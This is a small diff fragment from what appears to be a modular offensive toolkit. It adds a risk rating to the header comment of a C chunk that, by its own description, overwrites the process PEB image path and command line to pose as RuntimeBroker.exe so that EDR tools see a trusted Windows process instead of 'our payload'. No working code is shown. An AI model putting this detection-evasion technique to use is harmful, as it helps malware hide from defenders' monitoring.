@@ -2,6 +2,7 @@
 // depends: (none)
 // provides: masquerade_process
 // headers: windows.h
+// risk: medium
 // note: Overwrites PEB ImagePathName and CommandLine to mimic RuntimeBroker.exe. EDR process listings and behavioral rules see a trusted Windows process instead of our payload.
 
 #ifndef CHUNK_PROCESS_MASQUERADE
